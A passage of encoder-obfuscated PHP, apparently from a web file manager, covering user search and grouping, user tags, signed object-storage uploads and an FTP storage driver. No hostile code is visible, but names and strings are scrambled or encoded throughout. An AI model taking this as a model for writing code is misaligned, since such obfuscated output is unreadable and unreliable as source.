$ÉòµÚæú[$¥ùÑœ¡Š[2518]] = array($¥ùÑœ¡Š[461], "{$¶ğœ‰Êı}\x25"); } if (!$¶ğœ‰Êı) { $ÉòµÚæú = array(); } if (isset($—È¯åü[$¥ùÑœ¡Š[827]])) { $ÉòµÚæú[$¥ùÑœ¡Š[827]] = $—È¯åü[$¥ùÑœ¡Š[827]]; } $ÉòµÚæú = $this->parseWhereLike($ÉòµÚæú); $„¼‘±³´ = $this->_makeOrder()->where($ÉòµÚæú)->selectPage(20); if (!$„¼‘±³´ || count($„¼‘±³´[$¥ùÑœ¡Š[447]]) < 5 && Input::check($¶ğœ‰Êı, $¥ùÑœ¡Š[395])) { $¨öƒÖœ… = $this->_searchFromMeta($¥ùÑœ¡Š[539], $¶ğœ‰Êı, 10); $®¡ÖôÛ´ = $this->_searchFromMeta($¥ùÑœ¡Š[540], $¶ğœ‰Êı, 10); $ïî°©Ä = array_merge($¨öƒÖœ…, $®¡ÖôÛ´, $„¼‘±³´[$¥ùÑœ¡Š[447]]); $„¼‘±³´[$¥ùÑœ¡Š[447]] = array_unique_by_key($ïî°©Ä, $¥ùÑœ¡Š[1797]); $„¼‘±³´[$¥ùÑœ¡Š[444]][$¥ùÑœ¡Š[445]] = count($„¼‘±³´[$¥ùÑœ¡Š[447]]); $„¼‘±³´[$¥ùÑœ¡Š[444]][$¥ùÑœ¡Š[446]] = ceil($„¼‘±³´[$¥ùÑœ¡Š[444]][$¥ùÑœ¡Š[445]] / $„¼‘±³´[$¥ùÑœ¡Š[444]][$¥ùÑœ¡Š[441]]); } $this->_listDataApply($„¼‘±³´[$¥ùÑœ¡Š[447]]); $this->_filterByGroup($„¼‘±³´, $¢–Üıæç); return $„¼‘±³´; } private function _filterByGroup(&$ğ­úŸÛ, $™ğ€Ä™‰) { $“Ñ¬Ö´Î =& $_SERVER[ùèÅ´Ãš]; if (!$™ğ€Ä™‰) { return $ğ­úŸÛ; } foreach ($ğ­úŸÛ[$“Ñ¬Ö´Î[447]] as $šúûÂßÌ => &$«¼ä—¯°) { $ä¼­êœ– = array_to_keyvalue($«¼ä—¯°[$“Ñ¬Ö´Î[1403]], $“Ñ¬Ö´Î[12], $“Ñ¬Ö´Î[1404]); if (!in_array($™ğ€Ä™‰, $ä¼­êœ–)) { unset($ğ­úŸÛ[$“Ñ¬Ö´Î[447]][$šúûÂßÌ]); } } unset($«¼ä—¯°); $ğ­úŸÛ[$“Ñ¬Ö´Î[447]] = array_values($ğ­úŸÛ[$“Ñ¬Ö´Î[447]]); $ğ­úŸÛ[$“Ñ¬Ö´Î[444]] = array($“Ñ¬Ö´Î[2261] => count($ğ­úŸÛ[$“Ñ¬Ö´Î[447]]), $“Ñ¬Ö´Î[2259] => $ğ­úŸÛ[$“Ñ¬Ö´Î[444]][$“Ñ¬Ö´Î[441]], $“Ñ¬Ö´Î[2258] => 1, $“Ñ¬Ö´Î[2260] => 1); } private function _searchFromMeta($à¸ş„½ú, $¼•ÚÇíì, $şãÕÉ®) { $£ñ¯Ÿ›¬ =& $_SERVER[ùèÅ´Ãš]; $¼•ÚÇíì = strtolower($¼•ÚÇíì); $öÃÛ±µÓ = array($£ñ¯Ÿ›¬[97] => $à¸ş„½ú, $£ñ¯Ÿ›¬[452] => array($£ñ¯Ÿ›¬[461], "\x25{$¼•ÚÇíì}\x25")); $öÃÛ±µÓ = $this->parseWhereLike($öÃÛ±µÓ); $§æ‘—î© = Model($£ñ¯Ÿ›¬[2539])->where($öÃÛ±µÓ)->limit($şãÕÉ®)->select(); if (!$§æ‘—î©) { return array(); } $§æ‘—î© = array_to_keyvalue($§æ‘—î©, $£ñ¯Ÿ›¬[12], $£ñ¯Ÿ›¬[1797]); $ä¬š²´µ = $this->where(array($£ñ¯Ÿ›¬[1788] => array($£ñ¯Ÿ›¬[7], $§æ‘—î©)))->select(); if (!$ä¬š²´µ) { return array(); } return $ä¬š²´µ; } private function _listDataApplyItem($¦óšûñ) { $óòüû¶ß = array($¦óšûñ); $this->_listDataApply($óòüû¶ß); return $óòüû¶ß[0]; } private function _listDataApply(&$‚¸ŒœÏš) { $´Œ¿ş‹² =& $_SERVER[ùèÅ´Ãš]; if (!$‚¸ŒœÏš) { return; } array_remove_key($‚¸ŒœÏš, $´Œ¿ş‹²[977]); $î‡Úû‡ = array_to_keyvalue($‚¸ŒœÏš, $´Œ¿ş‹²[12], $´Œ¿ş‹²[1797]); $this->_listAppendGroup($‚¸ŒœÏš, $î‡Úû‡); $this->_listAppendMeta($‚¸ŒœÏš, $î‡Úû‡); $this->_listAppendSourceRoot($‚¸ŒœÏš, $î‡Úû‡); } private function _listAppendSourceRoot(&$ˆ®÷ÏÁú, $Ó˜ı¿£») { $ßÙ°˜ =& $_SERVER[ùèÅ´Ãš]; $é×ùÆîÄ = Model($ßÙ°˜[908])->listSourceRoot(SourceModel::TYPE_USER, $Ó˜ı¿£»); $é×ùÆîÄ = array_to_keyvalue($é×ùÆîÄ, $ßÙ°˜[573]); $é×ùÆîÄ = array_remove_key($é×ùÆîÄ, $ßÙ°˜[573]); foreach ($ˆ®÷ÏÁú as &$áà‡·Î) { $áà‡·Î[$ßÙ°˜[90]] = $é×ùÆîÄ[$áà‡·Î[$ßÙ°˜[1797]]] ? $é×ùÆîÄ[$áà‡·Î[$ßÙ°˜[1797]]] : array(); } unset($áà‡·Î); } private function _listAppendGroup(&$ğÅ¾ñ½Ñ, $÷Ü—¶×ø) { $æÜª€ñ =& $_SERVER[ùèÅ´Ãš]; $ò†”Û = array($æÜª€ñ[1797] => array($æÜª€ñ[7], $÷Ü—¶×ø)); $íá£çÎ¬ = Model($æÜª€ñ[2092])->where($ò†”Û)->select(); $öÔ¬¹˜« = array_to_keyvalue($íá£çÎ¬, $æÜª€ñ[12], $æÜª€ñ[1404]); $öÔ¬¹˜« = array_remove_value(array_unique($öÔ¬¹˜«), $æÜª€ñ[231]); if (!$öÔ¬¹˜« || !$íá£çÎ¬) { return; } $ò†”Û = array($æÜª€ñ[1404] => array($æÜª€ñ[7], $öÔ¬¹˜«)); $¨Ú­×Ö = Model($æÜª€ñ[1402])->field($æÜª€ñ[2540])->where($ò†”Û)->select(); $¨Ú­×Ö = array_to_keyvalue($¨Ú­×Ö, $æÜª€ñ[1404]); $íá£çÎ¬ = array_to_keyvalue_group($íá£çÎ¬, $æÜª€ñ[1797]); foreach ($íá£çÎ¬ as &$¿Ä™Õ·¨) { $ıß® ó = array(); foreach ($¿Ä™Õ·¨ as $˜ãğ¦¸®) { if (!$˜ãğ¦¸®[$æÜª€ñ[2106]]) { continue; } $İ¸Ê÷ˆÄ = Model($æÜª€ñ[575])->listData($˜ãğ¦¸®[$æÜª€ñ[2106]]); $ıß® ó[] = array($æÜª€ñ[1404] => $˜ãğ¦¸®[$æÜª€ñ[1404]], $æÜª€ñ[2541] => $¨Ú­×Ö[$˜ãğ¦¸®[$æÜª€ñ[1404]]][$æÜª€ñ[32]], $æÜª€ñ[588] => $¨Ú­×Ö[$˜ãğ¦¸®[$æÜª€ñ[1404]]][$æÜª€ñ[588]], $æÜª€ñ[489] => $İ¸Ê÷ˆÄ); } $¿Ä™Õ·¨ = $ıß® ó; } unset($¿Ä™Õ·¨); foreach ($ğÅ¾ñ½Ñ as &$ØçâúÖ) { $ØçâúÖ[$æÜª€ñ[1403]] = array(); if (isset($íá£çÎ¬[$ØçâúÖ[$æÜª€ñ[1797]]])) { $ØçâúÖ[$æÜª€ñ[1403]] = $íá£çÎ¬[$ØçâúÖ[$æÜª€ñ[1797]]]; } } unset($ØçâúÖ); } public function userAppendGroup($ñ¨ª½–³) { $Ç’éÁ‘¸ =& $_SERVER[ùèÅ´Ãš]; if (!$ñ¨ª½–³) { return array(); } $this->_listAppendGroup($ñ¨ª½–³, array_to_keyvalue($ñ¨ª½–³, $Ç’éÁ‘¸[12], $Ç’éÁ‘¸[1797])); return $ñ¨ª½–³; } private function _listAppendMeta(&$ä½†Ó¬, $ÊŠúÏÕé) { $ñúüúÔŠ =& $_SERVER[ùèÅ´Ãš]; $î¡¡öåŸ = UserJobModel::JOB_KEY; $éĞÒ¾ ° = array($ñúüúÔŠ[2090]); $ÅÇ‡Æ œ = array($ñúüúÔŠ[1797] => array($ñúüúÔŠ[7], $ÊŠúÏÕé)); $æ­²÷¹¬ = Model($ñúüúÔŠ[2517])->where($ÅÇ‡Æ œ)->select(); $ÅˆËÖêÔ = array(); foreach ($æ­²÷¹¬ as $ã„æ•ÆÙ) { $È¢İÁ¬ = $ã„æ•ÆÙ[$ñúüúÔŠ[1797]]; if (!isset($ÅˆËÖêÔ[$È¢İÁ¬])) { $ÅˆËÖêÔ[$È¢İÁ¬] = array(); } $ÅˆËÖêÔ[$È¢İÁ¬][$ã„æ•ÆÙ[$ñúüúÔŠ[97]]] = $ã„æ•ÆÙ[$ñúüúÔŠ[452]]; } $”®®Ï”˜ = Model($ñúüúÔŠ[2542]); foreach ($ä½†Ó¬ as &$²¿ÜÔ‚Œ) { $È¢İÁ¬ = $²¿ÜÔ‚Œ[$ñúüúÔŠ[1797]]; $¨Şï— = isset($ÅˆËÖêÔ[$È¢İÁ¬]) ? $ÅˆËÖêÔ[$È¢İÁ¬] : array(); $²¿ÜÔ‚Œ[$ñúüúÔŠ[543]] = array_field_key($¨Şï—, $éĞÒ¾ °); $²¿ÜÔ‚Œ[$ñúüúÔŠ[2543]] = array(); if (isset($¨Şï—[$î¡¡öåŸ])) { $²¿ÜÔ‚Œ[$ñúüúÔŠ[2543]] = $”®®Ï”˜->getUserJobInfo($¨Şï—[$î¡¡öåŸ]); } } unset($²¿ÜÔ‚Œ); } protected function groupUserAll($”İÀ …) { $ÃÌÈñõÆ =& $_SERVER[ùèÅ´Ãš]; if (!$”İÀ …) { return !1; } $öÎƒúô = Model($ÃÌÈñõÆ[2092])->field($ÃÌÈñõÆ[1797])->where(array($ÃÌÈñõÆ[1404] => array($ÃÌÈñõÆ[7], $”İÀ …)))->select(); $öÎƒúô = array_to_keyvalue($öÎƒúô, $ÃÌÈñõÆ[12], $ÃÌÈñõÆ[1797]); return array_unique($öÎƒúô); } public function userSearch($¯£åÚ™´, $®­ıøæ• = "\x2a") { return Model($_SERVER[ùèÅ´Ãš][601])->where($¯£åÚ™´)->field($®­ıøæ•)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($À¬¥½ôÒ) { $ş Âƒëæ =& $_SERVER[ùèÅ´Ãš]; $À·ñœÒŸ = defined($ş Âƒëæ[2228]) && USER_ID ? USER_ID : $ş Âƒëæ[12]; return "\x55\163\145\162\x4f\x70\164\x69\x6f\156\x5f{$À¬¥½ôÒ}\x5f" . $À·ñœÒŸ; } protected function filterWhere($ÒÓ§Åƒ¥) { $ ˜ğËª =& $_SERVER[ùèÅ´Ãš]; $ÒÓ§Åƒ¥[$ ˜ğËª[1797]] = defined($ ˜ğËª[2228]) && USER_ID ? USER_ID : $ ˜ğËª[12]; return $ÒÓ§Åƒ¥; } public function cacheRemoveUser($¡¡Ãºˆ³, $ë»—¼) { return Cache::remove("\x55\163\x65\x72\x4f\x70\x74\151\157\x6e\137{$¡¡Ãºˆ³}\137" . $ë»—¼); } protected function optionDefault($ˆöÒéó = '') { $Š»‰¦© =& $_SERVER[ùèÅ´Ãš]; if ($ˆöÒéó == $Š»‰¦©[12]) { return $GLOBALS[$Š»‰¦©[6]][$Š»‰¦©[2544]]; } if ($ˆöÒéó == $Š»‰¦©[2545]) { return $GLOBALS[$Š»‰¦©[6]][$Š»‰¦©[2546]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\164\x61\147\114\x69\163\164"; public $modelType = "\x55\x73\x65\x72\x4f\x70\164\151\x6f\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\x79\154\145", "\x73\157\162\x74"); public function listData($ûŠš„ö˜ = false, $™¼óË˜ = "\x73\157\x72\x74", $¶ÆÕà”Ş = false) { return parent::listData($ûŠš„ö˜, $™¼óË˜, $¶ÆÕà”Ş); } public function remove($•ïôÀşÍ) { return parent::remove($•ïôÀşÍ); } public function add($‹œ³›˜Æ, $¸Ã¢ = "\x6c\141\x62\145\x6c\55\147\x72\145\171\x2d\156\x6f\x72\x6d\x61\154") { $¼ïˆ¥¥¹ =& $_SERVER[ùèÅ´Ãš]; if ($this->findByName($‹œ³›˜Æ)) { return !1; } $Ã¨éÒŒÊ = array($¼ïˆ¥¥¹[496] => $‹œ³›˜Æ, $¼ïˆ¥¥¹[562] => $¸Ã¢, $¼ïˆ¥¥¹[2001] => $this->getSort($¼ïˆ¥¥¹[338]) + 1); return parent::insert($Ã¨éÒŒÊ); } public function update($¦‰Â›®ä, $¡™Ùé–ô) { $—Úúìä =& $_SERVER[ùèÅ´Ãš]; $çƒĞ‰„´ = $this->listData($¦‰Â›®ä); $‹Â£¾‹Î = $this->findByName($¡™Ùé–ô[$—Úúìä[32]]); if (!$çƒĞ‰„´ || $‹Â£¾‹Î && $‹Â£¾‹Î[$—Úúìä[477]] != $çƒĞ‰„´[$—Úúìä[477]]) { return !1; } return parent::update($¦‰Â›®ä, $¡™Ùé–ô); } public function moveTop($”â³İ¡ù) { $¿¨¾Öñ =& $_SERVER[ùèÅ´Ãš]; $ØâĞ™ö‡ = parent::listData(); $Åº²¯â = $this->getSort($¿¨¾Öñ[337]); foreach ($ØâĞ™ö‡ as &$’®¶Ô­º) { if ($’®¶Ô­º[$¿¨¾Öñ[477]] == $”â³İ¡ù) { $’®¶Ô­º[$¿¨¾Öñ[2021]] = $Åº²¯â; continue; } $’®¶Ô­º[$¿¨¾Öñ[2021]] += 1; } unset($’®¶Ô­º); return parent::resetData($ØâĞ™ö‡); } public function moveBottom($ˆ·Şáò) { $›´äÎÄ‹ =& $_SERVER[ùèÅ´Ãš]; $¿áÑ«€Œ = $this->getSort($›´äÎÄ‹[338]) + 1; return parent::update($ˆ·Şáò, array($›´äÎÄ‹[2021] => $¿áÑ«€Œ)); } public function resetSort($Š¯øÄ°£) { $™Ó†Ôñ =& $_SERVER[ùèÅ´Ãš]; $ºª¬“‚ = array(); $Š¯øÄ°£ = is_array($Š¯øÄ°£) ? $Š¯øÄ°£ : array(); for ($¿åí ëÇ = 0; $¿åí ëÇ < count($Š¯øÄ°£); $¿åí ëÇ++) { $ºª¬“‚[$Š¯øÄ°£[$¿åí ëÇ] . $™Ó†Ôñ[12]] = $¿åí ëÇ + 1; } $¨¶ÂÉâ = parent::listData(); foreach ($¨¶ÂÉâ as &$ö–‡Ó¤Ü) { $Ÿœäú½Ÿ = $ºª¬“‚[$ö–‡Ó¤Ü[$™Ó†Ôñ[477]]]; $ö–‡Ó¤Ü[$™Ó†Ôñ[2021]] = $Ÿœäú½Ÿ ? $Ÿœäú½Ÿ : $ö–‡Ó¤Ü[$™Ó†Ôñ[2021]]; } unset($ö–‡Ó¤Ü); return parent::resetData($¨¶ÂÉâ); } private function getSort($á×ò»•) { $”÷Ûó€ =& $_SERVER[ùèÅ´Ãš]; $´“ºÎÑã = parent::listData(); $ÓÂ¯ñ¡ = array_to_keyvalue($´“ºÎÑã, $”÷Ûó€[12], $”÷Ûó€[2021]); if (!$ÓÂ¯ñ¡) { $ÓÂ¯ñ¡ = array(0); } $ìÜúáû = $á×ò»• == $”÷Ûó€[338] ? max($ÓÂ¯ñ¡) : min($ÓÂ¯ñ¡); return intval($ìÜúáû); } } goto C¸›¶’³Ç‰; e’Ö¯îĞàƒ: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ß‹©öâ“) { parent::__construct($ß‹©öâ“); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¹Ù–¯”ì) { parent::__construct($¹Ù–¯”ì); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } public function uploadFormData($¨ò¼¤¡ë, $Úò…‰ı¡ = 3600) { $õÈ­È—Õ =& $_SERVER[ùèÅ´Ãš]; $İ¹èáá = $õÈ­È—Õ[232]; $†–Õü´ = $õÈ­È—Õ[260]; $ŸÊŸÁ³Õ = $õÈ­È—Õ[62]; $¶Õ¹±œ» = gmdate($õÈ­È—Õ[261]); $¶±¡û×Û = gmdate($õÈ­È—Õ[262]); $Ê©”×şò = $õÈ­È—Õ[263]; $«Ë‡´¨ú = $Úò…‰ı¡ . $õÈ­È—Õ[12]; $”ŠôÔéã = $õÈ­È—Õ[264]; $Ğ„ö›÷ë = array($this->accessKey, $¶±¡û×Û, $this->region, $ŸÊŸÁ³Õ, $Ê©”×şò); $—Ôöï«É = implode($õÈ­È—Õ[8], $Ğ„ö›÷ë); $ğ€„Äó = array($õÈ­È—Õ[265] => gmdate($õÈ­È—Õ[1434], strtotime($õÈ­È—Õ[267])), $õÈ­È—Õ[268] => array(array($õÈ­È—Õ[269] => $this->bucket), array($õÈ­È—Õ[309] => $İ¹èáá), array($õÈ­È—Õ[270], $õÈ­È—Õ[271], $õÈ­È—Õ[12]), array($õÈ­È—Õ[270], $õÈ­È—Õ[272], $õÈ­È—Õ[12]), array($õÈ­È—Õ[270], $õÈ­È—Õ[310], $õÈ­È—Õ[12]), array($õÈ­È—Õ[273] => $”ŠôÔéã), array($õÈ­È—Õ[274] => $—Ôöï«É), array($õÈ­È—Õ[275] => $†–Õü´), array($õÈ­È—Õ[276] => $¶Õ¹±œ»), array($õÈ­È—Õ[277] => $«Ë‡´¨ú))); $—ÛàÆÈÍ = base64_encode(json_encode($ğ€„Äó)); $¾¡´ˆÂà = hash_hmac($õÈ­È—Õ[278], $¶±¡û×Û, $õÈ­È—Õ[279] . $this->secret, !0); $Óó ñÌ = hash_hmac($õÈ­È—Õ[278], $this->region, $¾¡´ˆÂà, !0); $®õÕÅèÑ = hash_hmac($õÈ­È—Õ[278], $ŸÊŸÁ³Õ, $Óó ñÌ, !0); $Øñ†¤î× = hash_hmac($õÈ­È—Õ[278], $Ê©”×şò, $®õÕÅèÑ, !0); $±É¥¹œ = hash_hmac($õÈ­È—Õ[278], $—ÛàÆÈÍ, $Øñ†¤î×); $ïÉ€é¥© = array($õÈ­È—Õ[249] => $õÈ­È—Õ[12], $õÈ­È—Õ[297] => $õÈ­È—Õ[12], $õÈ­È—Õ[309] => $İ¹èáá, $õÈ­È—Õ[273] => $”ŠôÔéã, $õÈ­È—Õ[280] => $—ÛàÆÈÍ, $õÈ­È—Õ[311] => $—Ôöï«É, $õÈ­È—Õ[312] => $†–Õü´, $õÈ­È—Õ[313] => $¶Õ¹±œ», $õÈ­È—Õ[314] => $«Ë‡´¨ú, $õÈ­È—Õ[315] => $±É¥¹œ, $õÈ­È—Õ[209] => $this->getHost()); return $ïÉ€é¥©; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($…Ëæùí€) { parent::__construct(); if (count($…Ëæùí€) > 0) { $this->_init($…Ëæùí€); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÇÑĞö¶ù) { $€†„Õ«Ü =& $_SERVER[ùèÅ´Ãš]; global $config; $this->appCharset = $config[$€†„Õ«Ü[1460]]; $this->systemCharset = $config[$€†„Õ«Ü[1461]]; if (isset($ÇÑĞö¶ù[$€†„Õ«Ü[1462]]) && $ÇÑĞö¶ù[$€†„Õ«Ü[1462]]) { $this->systemCharset = $ÇÑĞö¶ù[$€†„Õ«Ü[1462]]; } } public function iconvApp($î  “¶Ê) { return $this->iconvTo($î  “¶Ê, $this->systemCharset, $this->appCharset); } public function iconvSystem($œŠŞü§Â) { return $this->iconvTo($œŠŞü§Â, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÍÑšÕ›í) { $İôÊ°ò =& $_SERVER[ùèÅ´Ãš]; $¥î±‡¤ü = $this->iconvApp($this->pathBase); $ÍÑšÕ›í = $this->iconvApp($ÍÑšÕ›í); if (substr($¥î±‡¤ü, 0, 2) == $İôÊ°ò[1432]) { $¥î±‡¤ü = BASIC_PATH . substr($¥î±‡¤ü, 2); } if (substr($ÍÑšÕ›í, 0, 2) == $İôÊ°ò[1432]) { $ÍÑšÕ›í = BASIC_PATH . substr($ÍÑšÕ›í, 2); } $¥î±‡¤ü = KodIO::clear($¥î±‡¤ü); $ÍÑšÕ›í = KodIO::clear($ÍÑšÕ›í); $ÍÑšÕ›í = substr($ÍÑšÕ›í, strlen($¥î±‡¤ü)); if (empty($this->pathDriver)) { return $ÍÑšÕ›í; } return $this->pathDriver . $İôÊ°ò[8] . ltrim($ÍÑšÕ›í, $İôÊ°ò[8]); } private function _init($á¨½§€« = array()) { $¦ôŠºÔ =& $_SERVER[ùèÅ´Ãš]; if (!function_exists($¦ôŠºÔ[1463])) { throw new Exception(LNG($¦ôŠºÔ[1464])); } $this->config = $á¨½§€«; $this->charsetReset($á¨½§€«); foreach ($á¨½§€« as $ÃºŸŞ”¹ => $ŸÃØˆ¶Í) { if (isset($this->{$ÃºŸŞ”¹})) { $this->{$ÃºŸŞ”¹} = $ŸÃØˆ¶Í; } } return $this->_login($á¨½§€«); } private function _login($³Î¬Òâ) { $šğÄ°ÏŸ =& $_SERVER[ùèÅ´Ãš]; static $÷¦ë©àò = array(); $ù—¼Œ‰÷ = md5(json_encode($³Î¬Òâ)); if (isset($÷¦ë©àò[$ù—¼Œ‰÷])) { foreach ($÷¦ë©àò[$ù—¼Œ‰÷] as $ëé˜­” => $ğß–ó¬Ÿ) { $this->{$ëé˜­”} = $ğß–ó¬Ÿ; } return !0; } $é«ã§ØŸ = parse_url(trim($this->server, $šğÄ°ÏŸ[8])); $this->host = $é«ã§ØŸ[$šğÄ°ÏŸ[209]]; $ÍùºÛ¥Ñ = isset($é«ã§ØŸ[$šğÄ°ÏŸ[208]]) && $é«ã§ØŸ[$šğÄ°ÏŸ[208]] == $šğÄ°ÏŸ[1465] ? !0 : !1; $this->scheme = $ÍùºÛ¥Ñ ? $šğÄ°ÏŸ[1466] : $šğÄ°ÏŸ[1467]; $this->port = isset($é«ã§ØŸ[$šğÄ°ÏŸ[210]]) ? $é«ã§ØŸ[$šğÄ°ÏŸ[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($šğÄ°ÏŸ[1468]) . $this->host . $šğÄ°ÏŸ[4] . $this->port, !0); return !1; } $õ÷½ˆâÑ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$õ÷½ˆâÑ) { $this->writeLog(LNG($šğÄ°ÏŸ[1469]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $šğÄ°ÏŸ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ååûöæï = $this->pasv == $šğÄ°ÏŸ[91] ? !0 : !1; @ftp_pasv($this->connect, $Ååûöæï); $÷¦ë©àò[$ù—¼Œ‰÷] = array($šğÄ°ÏŸ[1470] => $this->connect, $šğÄ°ÏŸ[209] => $this->host, $šğÄ°ÏŸ[208] => $this->scheme, $šğÄ°ÏŸ[210] => $this->port); return $õ÷½ˆâÑ; } private function _isconn($‹ùãõÌø = true) { if (is_resource($this->connect)) { return !0; } if (!$‹ùãõÌø) { return !1; } return $this->_login($this->config); } public function mkfile($Û°ÑÃ³‡, $ï¼€•Íş = '', $‡¿ŒÚ›ş = REPEAT_RENAME) { if ($this->setContent($Û°ÑÃ³‡, $ï¼€•Íş)) { return $this->getPathOuter($Û°ÑÃ³‡); } $this->writeLog(LNG($_SERVER[ùèÅ´Ãš][1471]), !0); return !1; } public function mkdir($†”³Ôö, $äÒÃ™ê = REPEAT_SKIP) { $Âå™°õ =& $_SERVER[ùèÅ´Ãš]; if (!$†”³Ôö || $†”³Ôö == $Âå™°õ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $†”³Ôö = $this->iconvSystem($†”³Ôö); if ($this->_isFolder($†”³Ôö) || @ftp_mkdir($this->connect, $†”³Ôö)) { return $this->getPathOuter($†”³Ôö); } if (!$this->mkdir($this->pathFather($†”³Ôö))) { return !1; } if ($†”³Ôö = @ftp_mkdir($this->connect, $†”³Ôö)) { return $this->getPathOuter($†”³Ôö); } $õü§²ßÙ = __FUNCTION__ . $Âå™°õ[1472]; $this->writeLog($õü§²ßÙ, !0); return !1; } public function copyFile($ã‰­‘½Ú, $’”¹‡Ôİ) { if (!$this->_isconn()) { return !1; } $¹ğäÂ÷Ş = $this->pathThis($this->iconvSystem($ã‰­‘½Ú)); $¿ÙÈó–¡ = $this->tempFile($¹ğäÂ÷Ş); $³ƒ¨¿ = $this->iconvApp($¿ÙÈó–¡); $this->download($ã‰­‘½Ú, $³ƒ¨¿); $²†‰¬úÈ = $this->upload($’”¹‡Ôİ, $³ƒ¨¿); $this->tempFileRemve($¿ÙÈó–¡); return $²†‰¬úÈ; } public function moveFile($¹îœ»°ß, $‰¸¤ŞÑ) { if (!$this->_isconn()) { return !1; } $¹îœ»°ß = $this->iconvSystem($¹îœ»°ß); $‰¸¤ŞÑ = $this->iconvSystem($‰¸¤ŞÑ); $˜ÈğÖ = @ftp_rename($this->connect, $¹îœ»°ß, $‰¸¤ŞÑ); if (!$˜ÈğÖ) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } return $this->getPathOuter($‰¸¤ŞÑ); } public function delFile($¤¦¡Üâ) { if (!$this->_isconn()) { return !1; } $¤¦¡Üâ = $this->iconvSystem($¤¦¡Üâ); $Áß™‘¹Ñ = @ftp_delete($this->connect, $¤¦¡Üâ); if (!$Áß™‘¹Ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); } return $Áß™‘¹Ñ; } public function delFolder($åı•üø) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÃÏ£ÖÅ¢ = $°¡ªÔ«¦ = array(); $this->fileList($åı•üø, $ÃÏ£ÖÅ¢, $°¡ªÔ«¦, !0); $this->listItemCache = !0; foreach ($°¡ªÔ«¦ as $¹ø›´¿È) { $šä¢Í¼÷ = $this->iconvSystem($¹ø›´¿È[$_SERVER[ùèÅ´Ãš][32]]); $ÎÇŒâàÂ = @ftp_delete($this->connect, $šä¢Í¼÷); if (!$ÎÇŒâàÂ) { return !1; } } foreach ($ÃÏ£ÖÅ¢ as $šä¢Í¼÷) { $šä¢Í¼÷ = $this->iconvSystem($šä¢Í¼÷); $ÎÇŒâàÂ = @ftp_rmdir($this->connect, $šä¢Í¼÷); if (!$ÎÇŒâàÂ) { return !1; } } $åı•üø = $this->iconvSystem($åı•üø); return @ftp_rmdir($this->connect, $åı•üø); } public function rename($î˜­ƒá, $ğ½å¡¯„) { $œú¿§ë =& $_SERVER[ùèÅ´Ãš]; if (!$this->_isconn()) { return !1; } $ô¤“’¨© = $this->fileNameAuto($this->pathFather($î˜­ƒá), $ğ½å¡¯„); $ô¤“’¨© = $this->iconvSystem($ô¤“’¨©); $î˜­ƒá = $this->iconvSystem($î˜­ƒá); $­¤–Ä¿ô = $this->pathFather($î˜­ƒá); $Œ¸´ö‰ß = rtrim($­¤–Ä¿ô, $œú¿§ë[8]) . $œú¿§ë[8] . $ô¤“’¨©; $ô›Òƒ¾Ğ = @ftp_rename($this->connect, $î˜­ƒá, $Œ¸´ö‰ß); if (!$ô›Òƒ¾Ğ) { $this->writeLog(__FUNCTION__ . $œú¿§ë[1472], !0); return !1; } $Œ¸´ö‰ß = $this->iconvApp($Œ¸´ö‰ß); return $this->getPathOuter($Œ¸´ö‰ß); } private function folderInfo($Ã×ìÑè, $Å±¬·û– = false) { $úöÕöÂù =& $_SERVER[ùèÅ´Ãš]; $õÉ•Ó¯ä = array($úöÕöÂù[32] => $this->pathThis($Ã×ìÑè), $úöÕöÂù[87] => $this->getPathOuter($úöÕöÂù[8] . $Ã×ìÑè), $úöÕöÂù[33] => $úöÕöÂù[78]); if ($Å±¬·û–) { return $õÉ•Ó¯ä; } $õÉ•Ó¯ä[$úöÕöÂù[234]] = $õÉ•Ó¯ä[$úöÕöÂù[88]] = 0; $õÉ•Ó¯ä[$úöÕöÂù[235]] = $õÉ•Ó¯ä[$úöÕöÂù[236]] = !0; return $õÉ•Ó¯ä; } private function fileInfo($„ƒÏ×úı, $»ÉÉ·³¸ = false, $õªë‡±Á = array()) { $ù½İŒ  =& $_SERVER[ùèÅ´Ãš]; $é–Ô›®Á = array($ù½İŒ [32] => $this->pathThis($„ƒÏ×úı), $ù½İŒ [87] => $this->getPathOuter($ù½İŒ [8] . $„ƒÏ×úı), $ù½İŒ [33] => $ù½İŒ [233], $ù½İŒ [79] => isset($õªë‡±Á[$ù½İŒ [79]]) ? $õªë‡±Á[$ù½İŒ [79]] : 0, $ù½İŒ [169] => $this->ext($„ƒÏ×úı)); if ($»ÉÉ·³¸) { return $é–Ô›®Á; } $é–Ô›®Á[$ù½İŒ [234]] = $é–Ô›®Á[$ù½İŒ [88]] = 0; $é–Ô›®Á[$ù½İŒ [235]] = $é–Ô›®Á[$ù½İŒ [236]] = !0; $ıÚ¦äÓ = $this->iconvSystem($„ƒÏ×úı); $é–Ô›®Á[$ù½İŒ [88]] = @ftp_mdtm($this->connect, $ıÚ¦äÓ); if (empty($õªë‡±Á)) { $õªë‡±Á = $this->objectMeta($„ƒÏ×úı); if (!$õªë‡±Á) { return $é–Ô›®Á; } } $é–Ô›®Á[$ù½İŒ [79]] = $õªë‡±Á[$ù½İŒ [79]]; return $é–Ô›®Á; } public function 